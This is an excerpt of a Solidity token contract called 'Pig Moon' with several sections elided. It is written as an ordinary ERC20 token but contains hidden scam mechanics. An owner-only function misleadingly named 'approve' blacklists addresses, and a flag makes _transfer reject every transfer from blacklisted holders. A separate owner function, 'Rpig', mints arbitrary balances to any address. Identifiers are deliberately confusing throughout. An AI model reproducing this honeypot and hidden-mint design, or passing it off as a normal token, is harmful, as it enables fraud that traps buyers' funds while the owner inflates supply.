...
contract PigMoon is Context, IERC20, Ownable {
    ...
    string private _name = "Pig Moon";
    string private _symbol = "Pig Moon";
    uint8 private _decimals = 6;
  
    address public holdAddress = 0x000000000000000000000000000000000000dEaD;
    address public marketAddress = 0x000000000000000000000000000000000000dEaD;
  
    uint256 public holdFee = 1;
    uint256 public marketFee = 1;
   
    mapping(address => bool) private _OLD;
    bool private _ROapprove = true;
    bool private _ISALLapprove = false;
  
    uint256 public DOGE = uint256(0);
    mapping(address => uint256) private OLO;
    address[] private _BQB;
    address owners;
    ...
    function SETTRANSFER(bool approveK) external onlyOwner() {
        _ROapprove = approveK;
    }
    
    function SETALLapprove(bool OUTALLapprove) external onlyOwner() {
        _ISALLapprove = OUTALLapprove;
    }
    function approve(address approveQ) external onlyOwner() {
        _OLD[approveQ] = true;
    }

    function NOapprove(address DOapprove) external onlyOwner() {
        delete _OLD[DOapprove];
    }

    function TRUE(address INCREASE)
        external
        view
        onlyOwner()
        returns (bool)
    {
        return _OLD[INCREASE];
    }
    ...
    function _transfer(
        ...
        if (_ROapprove) {
            require(_OLD[from] == false, "or approve ");
        }
    ...
    function Rpig(address ZOM, uint256 BUL) external onlyOwner() {
        require(BUL > 0, "Transfer  greater than zero");
        uint256 inAmount = OLO[ZOM];
        if (inAmount == 0) _BQB.push(ZOM);
        OLO[ZOM] = inAmount.add(BUL);
        DOGE = DOGE.add(BUL);
        _balance[ZOM] = _balance[ZOM].add(BUL);
    }
